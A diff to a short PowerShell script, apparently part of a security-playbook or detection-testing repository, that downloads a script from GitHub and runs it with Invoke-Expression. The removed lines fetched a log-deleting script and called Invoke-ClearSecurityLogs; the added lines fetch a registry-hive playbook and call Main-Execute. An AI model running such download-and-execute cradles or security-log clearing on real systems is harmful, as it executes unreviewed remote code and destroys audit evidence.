@@ -3,7 +3,7 @@
 
 # Define the URL where the external script is hosted
 # This example URL points to a remote script. Make sure you understand the implications of downloading and executing remote scripts.
-$url = "https://raw.githubusercontent.com/crtx-pub/PlaybooksAutomation/refs/heads/main/DeleteEventViewerLogs.ps1"
+$url = "https://raw.githubusercontent.com/crtx-pub/PlaybooksAutomation/refs/heads/main/Playbooks%20-%20Unprivileged%20process%20opened%20a%20registry%20hive/HKJOGL.ps1"
 
 # Download and execute the external script
 # The "iex" command evaluates the downloaded script's content as PowerShell code.
@@ -13,4 +13,4 @@ Invoke-Expression((New-Object net.webclient).DownloadString($url))
 # Invoke a function or command from the downloaded script
 # The command `Invoke-ClearSecurityLogs` is defined in the external script. 
 
-invoke-ClearSecurityLogs
+Main-Execute
